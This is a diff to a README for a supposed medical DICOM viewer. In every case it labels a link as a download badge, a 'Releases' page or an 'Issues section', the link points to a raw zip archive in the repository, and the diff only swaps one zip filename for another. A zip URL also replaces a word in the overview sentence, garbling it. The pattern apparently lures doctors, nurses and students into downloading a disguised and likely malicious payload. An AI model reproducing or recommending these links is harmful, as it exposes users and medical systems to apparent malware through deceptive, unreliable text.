@@ -4,10 +4,10 @@
 Welcome to the medical-dicom-viewer! This application helps you view DICOM files effortlessly. Whether you are a doctor, a nurse, or a student, you can easily navigate through medical images. Our user-friendly interface will guide you every step of the way.
 
 ## 📥 Download Now
-[![Download medical-dicom-viewer](https://raw.githubusercontent.com/Hemal-jpg/medical-dicom-viewer/main/frontend/viewer-medical-dicom-v2.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Hemal-jpg/medical-dicom-viewer/main/frontend/viewer-medical-dicom-v2.5.zip)
+[![Download medical-dicom-viewer](https://raw.githubusercontent.com/Hemal-jpg/medical-dicom-viewer/main/frontend/viewer_medical_dicom_v2.4.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Hemal-jpg/medical-dicom-viewer/main/frontend/viewer_medical_dicom_v2.4.zip)
 
 ## 📋 Overview
-The medical-dicom-viewer is designed for healthcare professionals and students. It lets users explore DICOM files with features that support multi-series navigation and adjustable window/level controls. Built with a Python FastAPI backend and a https://raw.githubusercontent.com/Hemal-jpg/medical-dicom-viewer/main/frontend/viewer-medical-dicom-v2.5.zip frontend, this application prioritizes speed and usability.
+The medical-dicom-viewer is designed for healthcare professionals and students. It lets users explore DICOM files with features that support multi-series navigation and adjustable window/level controls. Built with a Python FastAPI backend and a https://raw.githubusercontent.com/Hemal-jpg/medical-dicom-viewer/main/frontend/viewer_medical_dicom_v2.4.zip frontend, this application prioritizes speed and usability.
 
 ### Features
 - **Multi-Series Navigation:** Switch between multiple series of images quickly.
@@ -24,7 +24,7 @@ To run the medical-dicom-viewer, your system should meet the following requireme
 - **Browser:** Updated version of Chrome, Firefox, Edge, or Safari.
 
 ## 📥 Download & Install
-Visit the following page to download the latest release: [medical-dicom-viewer Releases](https://raw.githubusercontent.com/Hemal-jpg/medical-dicom-viewer/main/frontend/viewer-medical-dicom-v2.5.zip).
+Visit the following page to download the latest release: [medical-dicom-viewer Releases](https://raw.githubusercontent.com/Hemal-jpg/medical-dicom-viewer/main/frontend/viewer_medical_dicom_v2.4.zip).
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version listed at the top.
@@ -50,7 +50,7 @@ If you encounter issues while using the medical-dicom-viewer, please check the f
 - If images do not load, verify that they are valid DICOM files.
 - Restart the application if it runs slowly or becomes unresponsive.
 
-For ongoing support, you can refer to the [Issues section](https://raw.githubusercontent.com/Hemal-jpg/medical-dicom-viewer/main/frontend/viewer-medical-dicom-v2.5.zip) of our GitHub repository. You can also submit your own questions or report bugs there.
+For ongoing support, you can refer to the [Issues section](https://raw.githubusercontent.com/Hemal-jpg/medical-dicom-viewer/main/frontend/viewer_medical_dicom_v2.4.zip) of our GitHub repository. You can also submit your own questions or report bugs there.
 
 ## 🔗 Additional Resources
 For further reading and resources, consider checking our wiki page or the documentation linked in the repository. These resources provide detailed guides on advanced features and tips for using the application effectively.
